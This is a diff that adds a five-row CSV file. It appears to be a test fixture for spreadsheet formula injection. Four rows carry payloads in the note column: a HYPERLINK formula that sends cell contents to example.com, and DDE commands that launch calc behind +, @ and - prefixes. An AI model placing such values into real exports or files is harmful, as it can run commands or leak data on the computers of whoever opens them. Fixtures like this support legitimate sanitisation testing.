@@ -1,0 +1,6 @@
+id,region,note,amount
+1,North,=HYPERLINK("https://example.com?d="&A1),10
+2,South,+cmd|'/c calc'!A1,20
+3,East,@SUM(1+1)*cmd|'/c calc'!A1,30
+4,West,-2+3+cmd|'/c calc'!A1,-40
+5,Central,plain text,50
